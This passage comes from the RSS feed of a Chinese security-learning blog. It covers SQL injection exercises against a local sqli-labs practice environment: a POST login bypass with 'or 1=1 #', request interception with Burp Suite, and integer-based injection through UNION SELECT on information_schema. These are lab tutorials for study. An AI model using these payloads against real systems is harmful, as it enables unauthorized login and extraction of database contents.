&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;span class=&#34;string&#34;&gt;&amp;#x27; and password = &amp;#x27;&lt;/span&gt;xxx&lt;span class=&#34;string&#34;&gt;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造 POST 请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; or 1=1 #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;登录成功:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205718001.png&#34; alt=&#34;image-20220929205718001&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用burpsuit来做post注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用burpsuit来做post注入&#34;&gt;#&lt;/a&gt; 使用 BurpSuit 来做 Post 注入&lt;/h2&gt;
&lt;p&gt;这里也稍微提及一下 BurpSuit 抓包工具的简单使用：&lt;/p&gt;
&lt;h3 id=&#34;firefox浏览器配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#firefox浏览器配置&#34;&gt;#&lt;/a&gt; FireFox 浏览器配置&lt;/h3&gt;
&lt;p&gt;FireFox 浏览器中，在” 工具栏 — 选项 — 高级 — 连接设置 “中，配置手动代理和端口号 (127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210357211.png&#34; alt=&#34;image-20220929210357211&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;burpsuit配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burpsuit配置&#34;&gt;#&lt;/a&gt; BurpSuit 配置&lt;/h3&gt;
&lt;p&gt;到 BurpSuit 里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210527792.png&#34; alt=&#34;image-20220929210527792&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;令burpsuit拦截到包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#令burpsuit拦截到包&#34;&gt;#&lt;/a&gt; 令 BurpSuit 拦截到包&lt;/h3&gt;
&lt;p&gt;点击 FireFox 的任意提交请求的按钮就可以令 BurpSuit 拦截到包。以 FireFox 为例就是，点击了这道题目中的 &lt;code&gt;Submit按钮&lt;/code&gt;  或 使用 Hackbar 的 &lt;code&gt;Execute按钮&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210640596.png&#34; alt=&#34;image-20220929210640596&#34;&gt;&lt;/p&gt;
&lt;p&gt;④在内容中鼠标右键点击后选择 Send to Reapeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210828967.png&#34; alt=&#34;image-20220929210828967&#34;&gt;&lt;/p&gt;
&lt;p&gt;⑤在 Reapter 中多次尝试修改注入内容来查看返回的包&lt;/p&gt;
&lt;p&gt;第一次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929211038588.png&#34; alt=&#34;image-20220929211038588&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210956005.png&#34; alt=&#34;image-20220929210956005&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>整型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql注入之整型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之整型注入&#34;&gt;#&lt;/a&gt; SQL 注入之整型注入&lt;/h1&gt;
&lt;p&gt;本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。&lt;/p&gt;
&lt;h2 id=&#34;环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境准备&#34;&gt;#&lt;/a&gt; 环境准备&lt;/h2&gt;
&lt;p&gt;当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928202842147.png&#34; alt=&#34;image-20220928202842147&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后点击 MySQL 管理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203059624.png&#34; alt=&#34;image-20220928203059624&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击 localhost，账户名 root，密码 root 即可进入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203206981.png&#34; alt=&#34;image-20220928203206981&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器，选择 sqli&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203903223.png&#34; alt=&#34;image-20220928203903223&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择第一个 Setup&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203930840.png&#34; alt=&#34;image-20220928203930840&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现这个界面，即完成了数据库的初始化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203950837.png&#34; alt=&#34;image-20220928203950837&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击后退键回到上一个页面，然后点击 Less-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204115026.png&#34; alt=&#34;image-20220928204115026&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现 SQLI DUMB SERIES-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204123886.png&#34; alt=&#34;image-20220928204123886&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来以 Less-2 作为例子进行讲解：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928210728567.png&#34; alt=&#34;image-20220928210728567&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入步骤&#34;&gt;#&lt;/a&gt; SQL 注入步骤&lt;/h2&gt;
&lt;h3 id=&#34;1判断是否有注入判断是否未严格校验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1判断是否有注入判断是否未严格校验&#34;&gt;#&lt;/a&gt; ①判断是否有注入 (判断是否未严格校验)&lt;/h3&gt;
&lt;h4 id=&#34;1可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1可控参数的改变能否影响页面的显示结果&#34;&gt;#&lt;/a&gt; 1) 可控参数的改变能否影响页面的显示结果&lt;/h4&gt;
&lt;p&gt;网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。&lt;/p&gt;
&lt;p&gt;点击查看网页源代码，在 Network 这里看到是 GET 请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213756712.png&#34; alt=&#34;image-20220928213756712&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们选择在链接后面加上 id 参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213510534.png&#34; alt=&#34;image-20220928213510534&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令其输出内容。&lt;/p&gt;
&lt;p&gt;此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214022889.png&#34; alt=&#34;image-20220928214022889&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2输入的sql语句是否能报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2输入的sql语句是否能报错&#34;&gt;#&lt;/a&gt; 2) 输入的 SQL 语句是否能报错&lt;/h4&gt;
&lt;p&gt;因为能通过数据库的报错，看到数据库的一些语句痕迹&lt;/p&gt;
&lt;p&gt;我们假设它后台的查询语句是&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; $id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜想：能否通过加单引号令其出错？&lt;/p&gt;
&lt;p&gt;因为：&lt;/p&gt;
&lt;p&gt;如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。&lt;/p&gt;
&lt;p&gt;如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214501924.png&#34; alt=&#34;image-20220928214501924&#34;&gt;&lt;/p&gt;
&lt;p&gt;黄字部分的报错语句，非常之重要！&lt;/p&gt;
&lt;p&gt;near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。&lt;/p&gt;
&lt;p&gt;为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &amp;quot;’ &#39;&amp;quot;（单引号）变为 &amp;quot;&amp;quot;&amp;quot;（双引号）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928215359897.png&#34; alt=&#34;image-20220928215359897&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令报错信息中 near &#39;xxxxx’中的 LIMIT 前一个符号发生改变。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，加入单引号会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#如果是单引号注入，加入单引号也会报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”&lt;/p&gt;
&lt;h4 id=&#34;3输入的sql语句能否不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3输入的sql语句能否不报错&#34;&gt;#&lt;/a&gt; 3) 输入的 SQL 语句能否不报错&lt;/h4&gt;
&lt;p&gt;为了查看我们的语句能够成功闭合&lt;/p&gt;
&lt;p&gt;那怎么区分到底是整型还是单引号呢？&lt;/p&gt;
&lt;p&gt;使用 # 来注释后面语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#加入#号后，两个语法依旧错误，故都会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果确实是报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220327744.png&#34; alt=&#34;image-20220928220327744&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来我们删掉单引号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，则删掉单引号，保留#号后，不会报错！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; # limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;2 #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220529170.png&#34; alt=&#34;image-20220928220529170&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2什么类型的注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2什么类型的注入&#34;&gt;#&lt;/a&gt; ②什么类型的注入&lt;/h3&gt;
&lt;p&gt;因此，此处经过上述报错信息确定，存在&lt;strong&gt;整型注入&lt;/strong&gt;！&lt;/p&gt;
&lt;h3 id=&#34;3语句是否能够被恶意修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3语句是否能够被恶意修改&#34;&gt;#&lt;/a&gt; ③语句是否能够被恶意修改&lt;/h3&gt;
&lt;p&gt;恶意修改主要指能否再加入一些我们想要的判断条件，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;# limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928221547372.png&#34; alt=&#34;image-20220928221547372&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果正如我们所料，空空如也。&lt;/p&gt;
&lt;h3 id=&#34;4是否能够成功执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4是否能够成功执行&#34;&gt;#&lt;/a&gt; ④是否能够成功执行&lt;/h3&gt;
&lt;p&gt;第三个能满足，其实第四个就顺带就 OK。&lt;/p&gt;
&lt;h3 id=&#34;5获取我们想要的数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5获取我们想要的数据&#34;&gt;#&lt;/a&gt; ⑤获取我们想要的数据&lt;/h3&gt;
&lt;p&gt;关键数据是保存在数据库里面的，关系如下：&lt;/p&gt;
&lt;p&gt;数据库 -&amp;gt; 表 -&amp;gt; 字段 -&amp;gt; 值&lt;/p&gt;
&lt;p&gt;打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928223622076.png&#34; alt=&#34;image-20220928223622076&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个库中有三个表非常值得我们关注：&lt;/p&gt;
&lt;p&gt;Schemata 表（包含所有的 &lt;code&gt;库名信息&lt;/code&gt; ）、Tables 表（包含所有的 &lt;code&gt;表名信息&lt;/code&gt; ）、Columns 表（包含所有的 &lt;code&gt;列名信息&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先是 Schemeta 表&lt;/strong&gt;， &lt;code&gt;schema_name&lt;/code&gt;  对应着所有数据库的名字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224006640.png&#34; alt=&#34;image-20220928224006640&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次是 Tables 表&lt;/strong&gt;， &lt;code&gt;table_name&lt;/code&gt;  这个列里，存储了 &lt;code&gt;table_schema对应的库&lt;/code&gt; 下面的所有表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224135720.png&#34; alt=&#34;image-20220928224135720&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后是 Columns 表&lt;/strong&gt;，通过 &lt;code&gt;table_schema&lt;/code&gt;  对应的库， &lt;code&gt;table_name&lt;/code&gt;  对应的表，&lt;strong&gt;使用 column_name 对应的列名，来唯一地定位某个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224405698.png&#34; alt=&#34;image-20220928224405698&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;1构造联合查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1构造联合查询&#34;&gt;#&lt;/a&gt; 1）构造联合查询&lt;/h4&gt;
&lt;p&gt;确定的整型注入中，我们需要构造出我们想要的查询内容，比如在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Schema 表&lt;/strong&gt;中获取 &lt;code&gt;schema_name&lt;/code&gt; ：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225341595.png&#34; alt=&#34;image-20220928225341595&#34;&gt;&lt;/p&gt;
&lt;p&gt;但如果像上面这样构造，会报错，我们需要使用到联合查询。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225106827.png&#34; alt=&#34;image-20220928225106827&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++&lt;strong&gt; 需要列数完全一致才可拼接&lt;/strong&gt; ++。&lt;/p&gt;
&lt;p&gt;因此，需要使用占位符来定位前面的查询是多少列：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#占位一个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位两个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位三个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
